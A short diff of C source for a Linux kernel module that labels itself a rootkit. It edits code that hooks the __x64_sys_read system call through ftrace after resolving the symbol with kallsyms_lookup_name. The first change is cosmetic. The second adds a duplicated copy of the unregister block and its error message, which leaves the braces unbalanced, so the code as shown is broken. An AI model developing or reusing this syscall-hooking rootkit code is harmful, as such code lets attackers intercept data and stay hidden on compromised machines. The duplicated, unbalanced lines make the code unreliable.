@@ -364,8 +364,7 @@ int install_read_hook(kallsyms_lookup_name_t lookup)
 
     read_hook.address = lookup(read_hook.name);
 
-    if (!read_hook.address)
-    {
+    if (!read_hook.address) {
         pr_err("[-] Symbol not found: __x64_sys_read\n");
         return -ENOENT;
     }
@@ -412,7 +411,11 @@ void uninstall_read_hook(void)
 {
     if (read_hook.ops.func != NULL) {
         int ret = unregister_ftrace_function(&read_hook.ops);
+    if (read_hook.ops.func != NULL) {
+        int ret = unregister_ftrace_function(&read_hook.ops);
 
+        if (ret) {
+            printk(KERN_ERR "rootkit: failed to unregister ftrace function (%d)\n", ret);
         if (ret) {
             printk(KERN_ERR "rootkit: failed to unregister ftrace function (%d)\n", ret);
         }
